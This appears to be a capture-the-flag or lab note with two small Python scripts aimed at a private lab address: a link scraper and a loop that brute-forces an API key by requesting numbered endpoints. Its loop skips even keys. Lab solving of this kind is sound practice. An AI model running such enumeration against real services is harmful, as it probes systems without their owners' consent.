to find url:
```python
import requests
from bs4 import BeautifulSoup
import sys

ip_address = "10.10.231.240"

def url_parser():
    if len(sys.argv) == 2:
        try:
            r = requests.get(sys.argv[1])
            if r.status_code == 200:
                soup = BeautifulSoup(r.text,'lxml')
                for a in soup.find_all('a', href=True):
                    links = a['href']
                    print(links)

        except Exception as e:
            print(f"an error occured!!! {e}")

url_parser()

```

to brute force api_key:
```python
import requests
import json
import sys
import random

def bruteforce():
    for key in range(1,100):
        if key%2 ==0:
            key+=1
        else:
            r=requests.get(f"http://10.10.231.240/api/{key}")
            print(r.text)


bruteforce()

```

